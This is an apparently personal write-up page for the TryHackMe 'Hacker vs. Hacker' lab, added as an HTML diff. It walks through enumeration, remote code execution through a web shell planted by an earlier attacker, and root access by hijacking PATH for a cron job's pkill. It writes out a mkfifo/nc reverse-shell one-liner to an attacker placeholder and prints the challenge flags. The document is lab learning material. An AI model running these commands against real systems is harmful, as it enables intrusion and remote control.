@@ -1,0 +1,1031 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Notes and write-ups by humbledragon669">
+      
+      
+        <meta name="author" content="janekpstudentad">
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/user_logo.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Hacker vs. Hacker - Offense, Defense, and Everything Between</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="purple" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#hacker-vs-hacker" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Offense, Defense, and Everything Between" class="md-header__button md-logo" aria-label="Offense, Defense, and Everything Between" data-md-component="logo">
+      
+  <img src="../../assets/user_logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Offense, Defense, and Everything Between
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Hacker vs. Hacker
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Offense, Defense, and Everything Between" class="md-nav__button md-logo" aria-label="Offense, Defense, and Everything Between" data-md-component="logo">
+      
+  <img src="../../assets/user_logo.png" alt="logo">
+
+    </a>
+    Offense, Defense, and Everything Between
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackviser/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hackviser Scenarios and Labs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackMe
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackMe
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Challenges
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../love_at_first_breach/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Love at First Breach
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../msc/msc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MSc
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Everything Between
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Everything Between
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../everything_between/articles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Articles
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../everything_between/blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../everything_between/cybersecurity_lab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cybersecurity Lab
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../everything_between/conferences_events/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Conferences/events
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../everything_between/resources/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Resources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Scanning
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-enumeration-80" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Enumeration (80)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Foothold
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:path-hijacking" class="md-tag">PATH-hijacking</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:challenge" class="md-tag">challenge</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:defensive" class="md-tag">defensive</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:easy" class="md-tag">easy</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:linux" class="md-tag">linux</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:offensive" class="md-tag">offensive</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+  </nav>
+
+
+
+<h1 id="hacker-vs-hacker">Hacker vs. Hacker</h1>
+<p><img alt="Hacker vs. Hacker" src="../logos/hacker_vs_hacker_logo.png" /></p>
+<p><strong>Platform:</strong> TryHackMe<br />
+<strong>Type:</strong> Challenge<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Link:</strong> <a href="https://tryhackme.com/room/hackervshacker">Hacker vs. Hacker</a>  </p>
+<h2 id="description">Description</h2>
+<p>"Someone has compromised this server already! Can you get in and evade their countermeasures?</p>
+<p>The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?"</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<p><div class="highlight"><pre><span></span><code><span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="o">=</span><span class="m">1000</span><span class="w"> </span>TARGET_IP_ADDRESS<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>^<span class="o">[</span><span class="m">0</span>-9<span class="o">]</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;\n&#39;</span><span class="w"> </span><span class="s1">&#39;,&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>s/,$//<span class="k">)</span>
+nmap<span class="w"> </span>-p<span class="nv">$ports</span><span class="w"> </span>-A<span class="w"> </span>-T4<span class="w"> </span>TARGET_IP_ADDRESS
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Host is up (0.019s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
+|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
+|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: RecruitSec: Industry Leading Infosec Recruitment
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%), Adtran embedded (92%)
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/h:adtran:424rg
+Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 - 5.15 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Adtran 424RG FTTH gateway (92%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></p>
+<h3 id="http-enumeration-80">HTTP Enumeration (80)</h3>
+<p><div class="highlight"><pre><span></span><code>ffuf<span class="w"> </span>-u<span class="w"> </span>http://TARGET_IP_ADDRESS/FUZZ<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt<span class="w"> </span>-ic<span class="w"> </span>-c
+</code></pre></div>
+<strong>Notes</strong><br />
+- No <code>robots.txt</code> or <code>sitemap</code> files<br />
+- <code>ffuf</code> reveals browsable <code>images</code>, <code>css</code>, and <code>dist</code> directory without interesting contents<br />
+- Web site contains ability to upload a CV; <code>ffuf</code> reveals <code>/cvs</code> directory (directory listing disabled), likely with <code>upload.php</code><br />
+- Source code reveals concerns about unrestricted file upload in CV feature</p>
+<h3 id="vulnerability-enumeration">Vulnerability enumeration</h3>
+<div class="highlight"><pre><span></span><code>searchsploit<span class="w"> </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w">  </span><span class="c1"># No results</span>
+searchsploit<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.41<span class="w">   </span><span class="c1"># Only result: DoS</span>
+</code></pre></div>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Attempt to upload legitimate PDF file using upload functionality<br />
+This results in a custom message:<br />
+<img alt="Shell upload fail" src="shell_upload_fail.png" /><br />
+Examination of source code reveals <code>upload.php</code> does nothing but display this text - no actual upload functionality:<br />
+<div class="highlight"><pre><span></span><code><span class="x">Hacked! If you dont want me to upload my shell, do better at filtering!</span>
+
+<span class="x">&lt;!-- seriously, dumb stuff:</span>
+
+<span class="x">$target_dir = &quot;cvs/&quot;;</span>
+<span class="x">$target_file = $target_dir . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);</span>
+
+<span class="x">if (!strpos($target_file, &quot;.pdf&quot;)) {</span>
+<span class="x">  echo &quot;Only PDF CVs are accepted.&quot;;</span>
+<span class="x">} else if (file_exists($target_file)) {</span>
+<span class="x">  echo &quot;This CV has already been uploaded!&quot;;</span>
+<span class="x">} else if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) {</span>
+<span class="x">  echo &quot;Success! We will get back to you.&quot;;</span>
+<span class="x">} else {</span>
+<span class="x">  echo &quot;Something went wrong :|&quot;;</span>
+<span class="x">}</span>
+
+<span class="x">--&gt;</span>
+</code></pre></div>
+<strong>Notes</strong><br />
+- Discovered code suggests that upload functionality may have accepted any file as long as it contained <code>.pdf</code> as part of the file name (not at the beginning)<br />
+- Commonly used file name for reverse shells is <code>shell.php</code><br />
+<strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Check for existence of <code>/cvs/shell.pdf.php</code><br />
+<strong>Notes</strong><br />
+-  <code>/cvs/shell.pdf.php</code> exists - reverse shells commonly configured for user interaction using <code>cmd</code> parameter<br />
+<strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Test for use of <code>cmd</code> parameter with discovered shell, e.g.: <code>http://&lt;TARGET_IP_ADDRESS&gt;/cvs/shell.pdf.php?cmd=whoami</code>
+RCE achieved with use of <code>cmd</code> parameter:<br />
+<img alt="RCE achieved" src="rce_achieved.png" /><br />
+<strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Enumerate local file system for user flag file
+<div class="highlight"><pre><span></span><code>ls<span class="w"> </span>-al<span class="w"> </span>/home
+total<span class="w"> </span><span class="m">12</span>
+drwxr-xr-x<span class="w">  </span><span class="m">3</span><span class="w"> </span>root<span class="w">    </span>root<span class="w">    </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">19</span><span class="w"> </span>root<span class="w">    </span>root<span class="w">    </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>..
+drwxr-xr-x<span class="w">  </span><span class="m">4</span><span class="w"> </span>lachlan<span class="w"> </span>lachlan<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>lachlan
+
+ls<span class="w"> </span>-al<span class="w"> </span>/home/lachlan
+total<span class="w"> </span><span class="m">36</span>
+drwxr-xr-x<span class="w"> </span><span class="m">4</span><span class="w"> </span>lachlan<span class="w"> </span>lachlan<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">3</span><span class="w"> </span>root<span class="w">    </span>root<span class="w">    </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>..
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>lachlan<span class="w"> </span>lachlan<span class="w">  </span><span class="m">168</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.bash_history
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>lachlan<span class="w"> </span>lachlan<span class="w">  </span><span class="m">220</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">25</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>.bash_logout
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>lachlan<span class="w"> </span>lachlan<span class="w"> </span><span class="m">3771</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">25</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>.bashrc
+drwx------<span class="w"> </span><span class="m">2</span><span class="w"> </span>lachlan<span class="w"> </span>lachlan<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.cache
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>lachlan<span class="w"> </span>lachlan<span class="w">  </span><span class="m">807</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">25</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>.profile
+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>lachlan<span class="w"> </span>lachlan<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>bin
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>lachlan<span class="w"> </span>lachlan<span class="w">   </span><span class="m">38</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>user.txt
+
+cat<span class="w"> </span>/home/lachlan/user.txt
+</code></pre></div></p>
+<details class="success">
+<summary>What is the user.txt flag?</summary>
+<p>thm{af7e46b68081d4025c5ce10851430617}</p>
+</details>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Enumerate <code>.bash_history</code><br />
+Reveals password has been changed and suggests another file to be enumerated (<code>/etc/cron.d/persistence</code>):<br />
+<img alt="lachlan .bash_history" src="lachlan_bash_history.png" />]<br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Enumerate indicated file<br />
+Reveals malicious killer script for terminal connections:<br />
+<img alt="persistence contents" src="persistence_contents.png" /><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Connect with discovered credentials and <code>-T</code> switch to disable pseudo-terminal<br />
+<strong>Notes</strong><br />
+<code>persistence</code> file shows that <code>PATH</code> has a directory writable by the <code>lachlan</code> user placed ahead of other non-writable locations<br />
+<code>persistence</code> file contains a single executable file referred to by name alone (<code>pkill</code>)<br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Create custom <code>pkill</code> executable in <code>/home/lachlan/bin</code> with reverse shell<br />
+<div class="highlight"><pre><span></span><code><span class="c1"># In attacker machine</span>
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">1234</span>
+<span class="c1"># In SSH session to target machine</span>
+<span class="nb">cd</span><span class="w"> </span>bin
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2&gt;&amp;1 | nc &lt;ATTACKER_IP_ADDRESS&gt; 1234 &gt;/tmp/f&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>pkill
+chmod<span class="w"> </span>+x<span class="w"> </span>pkill
+<span class="c1"># In attacker machine</span>
+$<span class="w"> </span>ls<span class="w"> </span>-al<span class="w"> </span>/root
+total<span class="w"> </span><span class="m">28</span>
+drwx------<span class="w">  </span><span class="m">4</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">19</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>..
+lrwxrwxrwx<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">9</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.bash_history<span class="w"> </span>-&gt;<span class="w"> </span>/dev/null
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">3106</span><span class="w"> </span>Dec<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.bashrc
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">161</span><span class="w"> </span>Dec<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.profile
+-rw-r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">   </span><span class="m">38</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>root.txt
+drwx------<span class="w">  </span><span class="m">3</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>snap
+drwx------<span class="w">  </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.ssh
+</code></pre></div></p>
+<details class="success">
+<summary>What is the proof.txt flag?</summary>
+<p>thm{7b708e5224f666d3562647816ee2a1d4}</p>
+</details>
+<p><strong>Date completed:</strong> 15/11/26<br />
